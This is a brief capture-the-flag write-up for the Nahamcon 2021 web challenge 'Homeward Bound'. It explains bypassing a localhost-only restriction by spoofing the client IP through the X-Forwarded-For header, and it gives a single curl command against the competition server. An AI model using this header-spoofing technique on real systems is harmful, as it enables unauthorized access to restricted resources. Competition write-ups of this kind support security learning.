---
layout: load_md
title: The White Circle | Nahamcon 2021 | Homeward Bound Writeup
desc: Check out our writeup for Homeward Bound for Nahamcon 2021 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Nahamcon 2021
parent: nahamcon_2021
category: web
challenge: Homeward Bound
tags: "web"
date: 2021-03-15T00:00:00+00:00
last_modified_at: 2021-03-15T00:00:00+00:00
---



In this challenge we were supposed to access internal files by spoofing client IP address, this can be done using `X-Forwarded-For` header

```
$ curl -H “X-Forwarded-For: 127.0.0.1” http://challenge.nahamcon.com:31428/
```
